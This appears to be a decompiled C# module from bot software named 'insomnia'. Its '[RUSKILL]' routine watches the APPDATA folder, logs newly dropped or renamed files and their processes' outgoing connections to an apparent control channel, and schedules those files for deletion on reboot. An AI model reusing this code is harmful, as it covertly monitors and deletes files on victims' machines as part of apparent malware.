using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace insomnia;

internal class Class19
{
	public static FileSystemWatcher Field1 = new FileSystemWatcher();

	public static void Method4()
	{
		Field1.Path = Environment.GetEnvironmentVariable("APPDATA");
		Field1.NotifyFilter = NotifyFilters.DirectoryName;
		Field1.NotifyFilter |= NotifyFilters.FileName;
		Field1.NotifyFilter |= NotifyFilters.Attributes;
		Field1.Changed += Method2;
		Field1.Created += Method2;
		Field1.Deleted += Method2;
		Field1.Renamed += Method3;
		try
		{
			Field1.EnableRaisingEvents = true;
		}
		catch
		{
		}
	}

	public static void Method3(object sender, RenamedEventArgs e)
	{
		try
		{
			Class31.Method3("[RUSKILL]: " + $"Dropped file renamed ({e.OldName} -> {e.Name})", Class26.Field3);
			Thread.Sleep(3000);
			Method1(e.FullPath);
			if (Class35.Method1(e.FullPath))
			{
				Class31.Method3("[RUSKILL]: File successfully marked for deletion upon reboot -> " + e.FullPath, Class26.Field3);
			}
		}
		catch
		{
		}
	}

	public static void Method2(object sender, FileSystemEventArgs e)
	{
		WatcherChangeTypes changeType = e.ChangeType;
		if (changeType != WatcherChangeTypes.Created)
		{
			return;
		}
		try
		{
			Class31.Method3("[RUSKILL]: " + $"New Drop -> {e.FullPath}", Class26.Field3);
			Thread.Sleep(3000);
			Method1(e.FullPath);
			if (Class35.Method1(e.FullPath))
			{
				Class31.Method3("[RUSKILL]: File successfully marked for deletion upon reboot -> " + e.FullPath, Class26.Field3);
			}
			Thread.Sleep(500);
		}
		catch
		{
		}
	}

	public static void Method1(string A_0)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (process.MainModule!.FileName!.Contains(A_0))
				{
					string text = Class33.Method3(process.ProcessName);
					if (text != "")
					{
						Class31.Method3("[RUSKILL]: Outgoing connection detected from " + process.ProcessName + " -> " + text, Class26.Field3);
					}
				}
			}
			catch
			{
			}
		}
	}
}
